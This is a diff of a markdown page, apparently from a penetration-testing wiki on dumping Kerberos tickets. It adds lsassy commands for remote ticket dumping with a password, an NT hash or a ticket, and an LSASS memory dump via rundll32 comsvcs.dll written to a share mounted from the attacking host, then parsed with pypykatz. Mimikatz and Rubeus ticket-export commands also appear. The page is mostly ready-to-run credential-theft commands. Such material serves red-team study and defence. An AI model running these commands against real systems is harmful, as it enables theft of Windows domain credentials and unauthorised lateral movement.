@@ -37,16 +37,33 @@ klist sessions
 ### Dump tickets
 
 {% tabs %}
-{% tab title="Mimikatz" %}
-[Mimikatz](https://github.com/gentilkiwi/mimikatz) can be use to dump TGTs from the LSASS process
+{% tab title="Unix-Like" %}
+From an Unix attacking machine, we can remotely dump tickets using [lsassy](https://github.com/Hackndo/lsassy).
 
+```bash
+# With a password
+lsassy -d <DOMAIN.LOCAL> -u <USER> -p <PASSWORD> <TARGET> -K '/tmp/kerberos_tickets'
+
+# With PtH
+lsassy -d <DOMAIN.LOCAL> -u <USER> -H <NTHash> <TARGET> -K '/tmp/kerberos_tickets'
+
+# With PtT
+lsassy -k <TARGET> -K '/tmp/kerberos_tickets'
 ```
-mimikatz # privilege::debug
-mimikatz # sekurlsa::tickets /export
+
+We also can do it manually by dumping LSASS memory using one of [this techniques](lsass/), exfiltrate the dump on our attacking machine, and then retrieve tickets using [pypykatz](https://github.com/skelsec/pypykatz).
+
+```bash
+# Example of a dump where Z: is mounted on the attacking host
+tasklist /fi "imagename eq lsass.exe"
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid Z:\lsass.dmp full
+
+# Get Tickets
+pypykatz lsa minidump /path/to/lsass.dmp -k /tmp/kerberos_tickets
 ```
 {% endtab %}
 
-{% tab title="Rubeus" %}
+{% tab title="Windows" %}
 [Rubeus](https://github.com/GhostPack/Rubeus) can also be use to dump TGTs from the LSASS process
 
 ```powershell
@@ -59,8 +76,17 @@ mimikatz # sekurlsa::tickets /export
 # Write ticket to disk
 [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
 ```
+
+[Mimikatz](https://github.com/gentilkiwi/mimikatz) can be use to dump TGTs from the LSASS process
+
+```
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+```
 {% endtab %}
 {% endtabs %}
+
+
 
 ### Ask a TGS
 
